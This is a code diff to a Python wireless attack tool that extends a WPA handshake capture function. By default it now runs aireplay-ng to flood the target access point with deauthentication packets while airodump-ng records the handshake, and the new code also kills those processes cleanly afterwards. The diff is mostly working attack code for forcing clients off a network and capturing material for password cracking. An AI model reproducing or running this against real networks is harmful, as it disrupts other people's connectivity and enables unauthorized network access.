@@ -56,11 +56,11 @@ def find_channel_by_bssid(interface, bssid, timeout=8):
     return max(set(channels), key=channels.count)
 
 
-def capture_handshake(interface, bssid, ssid, channel, prefix, duration=120):
+def capture_handshake(interface, bssid, ssid, channel, prefix, duration=120, deauth=True):
     interface = _ensure_str(interface)
     bssid = _ensure_str(bssid)
 
-    cmd = [
+    airodump_cmd = [
         "airodump-ng",
         "--bssid", bssid,
         "--essid", ssid,
@@ -69,34 +69,66 @@ def capture_handshake(interface, bssid, ssid, channel, prefix, duration=120):
         interface
     ]
 
-    print(f"Starting capture for {duration} seconds")
-    print(f"Command: {' '.join(cmd)}")
+    aireplay_cmd = [
+        "aireplay-ng",
+        "-0", "30",           
+        "-a", bssid,
+        interface
+    ]
 
+    print(f"Starting capture for {duration} seconds")
+    print(f"Command: {' '.join(airodump_cmd)}")
+    if deauth:
+        print(f"Deauth command: {' '.join(aireplay_cmd)}")
+    procs = []
     try:
-        proc = subprocess.Popen(
-            cmd,
+        airodump_proc = subprocess.Popen(
+            airodump_cmd,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
             preexec_fn=os.setsid
         )
-
+        procs.append(airodump_proc)
+        if deauth:
+            deauth_proc = subprocess.Popen(
+                aireplay_cmd,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                preexec_fn=os.setsid
+            )
+            procs.append(deauth_proc)
+            print(f"Deauth packets are being sent")
         time.sleep(duration)
-
         print("Time elapsed, stopping capture")
 
-        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
-        proc.wait(timeout=5)
+        for proc in procs:
+            try:
+                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                proc.wait(timeout=3)
+            except ProcessLookupError:
+                pass  
+            except subprocess.TimeoutExpired:
+                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)        
 
-        print("Capture stopped cleanly")
+        print(f"Capture stopped cleanly")
         print(f"Output file: {prefix}-01.cap")
 
         return True
 
     except KeyboardInterrupt:
-        print("\nInterrupted by user")
-        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+        print(f"Interrupted by user")
+        for proc in procs:
+            try:
+                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+            except:
+                pass
         return False
 
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"[!] Error: {e}")
+        for proc in procs:
+            try:
+                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+            except:
+                pass
         return False
